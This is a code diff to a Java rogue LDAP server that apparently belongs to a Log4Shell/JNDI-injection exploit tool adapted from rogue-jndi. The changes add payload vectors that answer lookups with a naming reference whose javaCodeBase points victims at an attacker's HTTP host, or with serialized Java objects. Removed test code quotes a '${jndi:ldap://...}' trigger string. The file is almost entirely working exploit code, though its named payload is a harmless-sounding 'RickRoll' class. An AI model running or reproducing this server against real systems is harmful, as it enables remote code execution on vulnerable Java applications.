@@ -9,11 +9,14 @@ import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPException;
 import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
+import itzbenz.payload.ObjectPayloadSerializable;
 
-import javax.naming.directory.InitialDirContext;
 import javax.net.ServerSocketFactory;
 import javax.net.SocketFactory;
 import javax.net.ssl.SSLSocketFactory;
+import java.io.ByteArrayOutputStream;
+import java.io.IOException;
+import java.io.ObjectOutputStream;
 import java.net.InetAddress;
 
 public class LDAPServer extends InMemoryOperationInterceptor {
@@ -21,24 +24,17 @@ public class LDAPServer extends InMemoryOperationInterceptor {
 
     public String host = "http://" + Main.address + ":" + Main.port + "/";
 
-    //to test thing
-    public static void main(String[] args) {
-        InitialDirContext idc = null;
-        //false positive check
-        if (LDAPServer.class.getClassLoader().getResource(Main.defaultPayload.replace('.', '/') + ".class") != null) {
-            throw new RuntimeException("payload already exists in current classloader");
-        }
-        try {
-            idc = new InitialDirContext();
-            //log4j: ${jndi:ldap://localhost:1389/o=reference,payload=itzbenz.payload.RickRoll}
-            Object o = idc.lookup("ldap://localhost:1389/o=reference,payload=itzbenz.payload.RickRoll");
-            System.out.println(o);
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
+
+    public static PayloadVector payloadVector = PayloadVector.JavaNamingReference;
+
+    public static void main(String[] args) throws ClassNotFoundException {
+        LDAPTest.main(args);
     }
 
+    //stolen from here, i can't read com.unboundid.ldap documentation
+    //https://github.com/veracode-research/rogue-jndi/blob/master/src/main/java/artsploit/LdapServer.java
     public void start() throws Exception {
+        System.out.println("Payload Vector: " + payloadVector);
         System.out.println("Starting LDAP server on 0.0.0.0:1389");
         InMemoryDirectoryServerConfig inMemoryOperationInterceptor = new InMemoryDirectoryServerConfig("dc=example,dc=com");
         inMemoryOperationInterceptor.setListenerConfigs(new InMemoryListenerConfig(
@@ -53,6 +49,8 @@ public class LDAPServer extends InMemoryOperationInterceptor {
         ds.startListening();
 
     }
+
+    ;
 
     @Override
     public void processSearchResult(InMemoryInterceptedSearchResult result) {
@@ -71,11 +69,39 @@ public class LDAPServer extends InMemoryOperationInterceptor {
             System.err.println("[-] Payload not found, using default: " + payload);
         }
         Entry e = new Entry(base);
-        System.out.println("Sending LDAP reference result for " + host + payload.replace('.', '/') + ".class");
-        e.addAttribute("objectClass", "javaNamingReference");//cool
-        e.addAttribute("javaClassName", payload); //unknown if fail
-        e.addAttribute("javaFactory", payload); //magic payload
-        e.addAttribute("javaCodeBase", host);
+        System.out.println("[+] PayloadVector: " + payloadVector);
+        switch (payloadVector) {
+            case JavaSerializationObject:
+            case JavaSerializationString:
+                Object payloadObject = payload;
+                if (payloadVector == PayloadVector.JavaSerializationObject) {
+                    payloadObject = new ObjectPayloadSerializable(payload);
+                }
+                try {
+                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                    ObjectOutputStream oos = new ObjectOutputStream(baos);
+                    oos.writeObject(payloadObject);
+                    e.addAttribute("javaClassName", payloadObject.getClass().getName());
+                    e.addAttribute("javaSerializedData", baos.toByteArray());
+                    if (payloadVector == PayloadVector.JavaSerializationObject)
+                        e.addAttribute("javaCodeBase", host);
+
+                } catch (IOException ex) {
+                    ex.printStackTrace();
+                }
+
+                break;
+            case JavaNamingReference:
+                System.out.println("Sending LDAP reference result for " + host + payload.replace('.', '/') + ".class");
+                e.addAttribute("objectClass", "javaNamingReference");//cool
+                e.addAttribute("javaClassName", payload); //unknown if fail ???
+                e.addAttribute("javaFactory", payload); //magic payload
+                e.addAttribute("javaCodeBase", host);//cool
+                break;
+            default:
+                System.err.println("[-] Unknown payload vector ???");
+        }
+
         try {
             result.sendSearchEntry(e);
         } catch (LDAPException ex) {
@@ -83,6 +109,8 @@ public class LDAPServer extends InMemoryOperationInterceptor {
         }
         result.setResult(new LDAPResult(0, ResultCode.SUCCESS));//great success
     }
+
+    enum PayloadVector {JavaNamingReference, JavaSerializationString, JavaSerializationObject}
 
 
 }
